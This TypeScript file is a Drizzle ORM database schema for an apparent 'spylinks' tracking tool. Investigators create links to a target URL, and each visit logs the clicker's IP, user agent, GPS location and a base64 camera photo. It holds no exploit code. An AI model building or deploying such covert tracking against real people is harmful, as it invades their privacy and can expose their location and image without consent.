import { mysqlTable, varchar, timestamp, boolean, serial, text } from 'drizzle-orm/mysql-core';

export const investigators = mysqlTable('investigators', {
  id: serial('id').primaryKey(),
  name: varchar('name', { length: 255 }).notNull(),
  email: varchar('email', { length: 255 }).notNull().unique(),
  password: varchar('password', { length: 255 }).notNull(),
  createdAt: timestamp('created_at').defaultNow(),
});

export const spylinks = mysqlTable('spylinks', {
  id: varchar('id', { length: 50 }).primaryKey(),
  investigatorId: serial('investigator_id'),
  targetUrl: varchar('target_url', { length: 1000 }).notNull(),
  category: varchar('category', { length: 100 }).default('Geral'),
  
  captureIp: boolean('capture_ip').default(true),
  captureGps: boolean('capture_gps').default(false),
  capturePhoto: boolean('capture_photo').default(false),
  
  createdAt: timestamp('created_at').defaultNow(),
});

export const logs = mysqlTable('logs', {
  id: serial('id').primaryKey(),
  spylinkId: varchar('spylink_id', { length: 50 }).references(() => spylinks.id),
  ip: varchar('ip', { length: 50 }),
  userAgent: text('user_agent'),
  gpsLocation: varchar('gps_location', { length: 255 }),
  photoBase64: text('photo_base64'),
  accessedAt: timestamp('accessed_at').defaultNow(),
});